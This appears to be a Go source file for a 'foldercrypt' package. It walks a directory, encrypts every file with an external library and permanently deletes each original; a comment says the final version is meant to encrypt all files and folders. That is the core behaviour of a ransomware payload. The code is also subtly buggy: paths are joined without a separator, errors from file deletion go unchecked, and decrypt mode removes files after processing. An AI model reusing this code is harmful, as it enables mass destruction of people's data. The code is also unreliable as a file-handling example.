package foldercrypt

import (
	"io/fs"
	"os"

	"github.com/Redhead92/redcrypt"
	"github.com/Redhead92/reddecrypt"
)

func check (e error){
	if e != nil{
		panic(e)
	}
}

func Foldercrypt(mode string, iFolder string, key string){

// WIP final code, encrypt all files and folders.

// test code, encrypt only indicated folders

switch mode{
// Decryption 
case "D":
	// Folder vars
	var temppath string
	folder := os.DirFS(iFolder)
	// walking system functions
	fs.WalkDir(folder, ".", func(path string, info fs.DirEntry, err error) error{
		check(err)
		temppath = iFolder + path
		fileinfo, err := os.Stat(temppath)
		check(err)

		// skip dirs
		if fileinfo.IsDir(){
			
		}else{
			//Decrypt file into plaintext
			reddecrypt.Reddecrypt(temppath,key)
			// Delete files permanently 
				os.Remove(temppath)
				check(err)
			}
		return nil
	})

case "E":
	// Folder vars
	var temppath string
	folder := os.DirFS(iFolder)
	// walking system functions
	fs.WalkDir(folder, ".", func(path string, info fs.DirEntry, err error) error{
		check(err)
		temppath = iFolder + path
		fileinfo, err := os.Stat(temppath)
		check(err)

		// skip dirs
		if fileinfo.IsDir(){
			
		}else{
			// Read plaintext file
				plainFile, err := os.ReadFile(temppath)
				check((err))
				plainFile = append(plainFile, []byte(temppath)...)
			// Encrypt + generate new encrypted file
				redcrypt.Redcrypt(iFolder, key,[]byte (plainFile)) 
			// Delete files permanently 
				os.Remove(temppath)
				check(err)
			}
		return nil
	})

}
}